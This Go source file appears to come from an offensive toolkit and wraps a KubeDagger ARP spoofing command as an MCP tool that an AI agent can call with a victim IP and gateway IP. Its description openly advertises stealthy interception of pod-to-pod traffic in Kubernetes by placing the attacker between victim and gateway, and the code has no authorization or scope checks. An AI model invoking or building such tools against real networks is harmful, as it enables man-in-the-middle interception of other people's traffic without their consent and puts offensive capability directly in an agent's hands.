package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type ARPSpoofInput struct {
	VictimIP  string `json:"victim_ip"`
	GatewayIP string `json:"gateway_ip"`
	Interface string `json:"interface,omitempty"`
}

type ARPSpoofTool struct {
	exec executor.Executor
}

func NewARPSpoof(exec executor.Executor) *ARPSpoofTool {
	return &ARPSpoofTool{exec: exec}
}

func (t *ARPSpoofTool) Name() string { return "kubedagger_arp_spoof" }

func (t *ARPSpoofTool) Description() string {
	return "Perform ARP spoofing via XDP to intercept pod-to-pod traffic within the same L2 segment. Injects gratuitous ARP replies at wire speed using XDP, faster and stealthier than userspace tools. Positions the attacker between a victim IP and the gateway."
}

func (t *ARPSpoofTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"victim_ip": {
				"type": "string",
				"description": "Victim IP address to intercept traffic for (required)"
			},
			"gateway_ip": {
				"type": "string",
				"description": "Gateway IP address to impersonate (required)"
			},
			"interface": {
				"type": "string",
				"description": "Network interface for ARP injection (default: eth0)"
			}
		},
		"required": ["victim_ip", "gateway_ip"]
	}`)
}

func (t *ARPSpoofTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input ARPSpoofInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateIP(input.VictimIP); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateIP(input.GatewayIP); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Interface, "interface"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"arp-spoof", "--victim-ip", input.VictimIP, "--gateway-ip", input.GatewayIP}
	if input.Interface != "" {
		args = append(args, "--interface", input.Interface)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger arp-spoof failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger ARP Spoof\n\n")
	if output == "" {
		sb.WriteString("ARP spoofing active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
